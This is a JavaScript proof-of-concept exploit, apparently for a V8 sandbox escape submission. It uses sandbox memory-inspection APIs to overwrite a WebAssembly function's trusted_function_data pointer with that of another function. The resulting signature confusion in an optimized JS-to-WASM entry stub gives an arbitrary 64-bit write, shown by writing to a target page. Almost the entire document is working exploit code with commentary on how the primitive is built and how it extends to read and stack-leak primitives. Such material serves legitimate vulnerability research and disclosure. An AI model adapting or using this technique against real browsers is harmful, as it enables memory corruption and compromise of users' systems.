//Prepare the WASM module
//Compiled using `wasm-as --enable-reference-types --enable-gc`
/*
(module
    (type $struct (struct (field $sfield (mut i64))))

    (func (export "struct_placeholder")
        (result (ref $struct))
        (struct.new $struct (i64.const 1234))
    )

    (func (export "write64")
        (param $addr i64)
        (param $val i64)
    )
    (func (export "write64_struct")
        (param $sval (ref $struct))
        (param $val i64)

        (struct.set $struct $sfield (local.get $sval) (local.get 1))
    )
)
*/
let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,21,4,95,1,126,1,96,0,1,100,0,96,2,126,126,0,96,2,100,0,126,0,3,4,3,1,2,3,7,49,3,18,115,116,114,117,99,116,95,112,108,97,99,101,104,111,108,100,101,114,0,0,7,119,114,105,116,101,54,52,0,1,14,119,114,105,116,101,54,52,95,115,116,114,117,99,116,0,2,10,25,3,8,0,66,210,9,251,0,0,11,3,0,1,11,10,0,32,0,32,1,251,5,0,0,11])
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInst = new WebAssembly.Instance(wasmModule);

let wasmWrite64 = wasmInst.exports.write64;
let wasmWrite64Struct = wasmInst.exports.write64_struct;

//Ensure the write64_struct WASM function is fully optimized
//This causes the elimination of any potential type checks from the function, essentially turning it into a thinly wrapped write primitive
let placeholder = wasmInst.exports.struct_placeholder();
for(let i = 0; i < 5000000; i++) wasmWrite64Struct(placeholder, 0n);

//Ensure the write64 JS2WASM stub is a purpose-compiled one instead of the generic Torque stub
//This bakes write64's (int64, int64) signature into the generated assembly code, independent of the function's stored signature
for(let i = 0; i < 5000000; i++) wasmWrite64(0n, 0n);

//Overwrite the trusted_function_data pointer of write64 with write64_struct's
//Since the signature is baked into the entry stub, its effective signature visible to JS doesn't change
//However, the stub still fetches and calls the call target of write64_struct's WasmFunctionData, resulting in type confusion
//No signature hash check trips since these are only added to WASM-internal callsites, and not entry stubs
let heapView = new DataView(new Sandbox.MemoryView(0, 0x100000000));
let addrof = (obj) => Sandbox.getAddressOf(obj) & ~1;
let hread32 = (addr) => heapView.getUint32(addr, true);
let hwrite32 = (addr, val) => heapView.setUint32(addr, val, true);

let write64SFI = hread32(addrof(wasmWrite64) + 0x10) & ~1;
let write64StructSFI = hread32(addrof(wasmWrite64Struct) + 0x10) & ~1;
let write64StructTFD = hread32(write64StructSFI + 0x4);
hwrite32(write64SFI + 0x4, write64StructTFD);

//The resulting type / function signature confusion can easily be turned into a write primitive
//Additionally, one may also obtain read / stack leak / other primitives in a similar manner

function write64(addr, val) {
    //References are passed last to WASM function, as such swap the order of arguments to account for this
    //The -7 corrects for the offset from the tagged WasmStruct object pointer to its first field
    wasmWrite64(val, addr - 7n);
}

//Write to the target page to demonstrate the sandbox escape
write64(BigInt(Sandbox.targetPage), 1234n);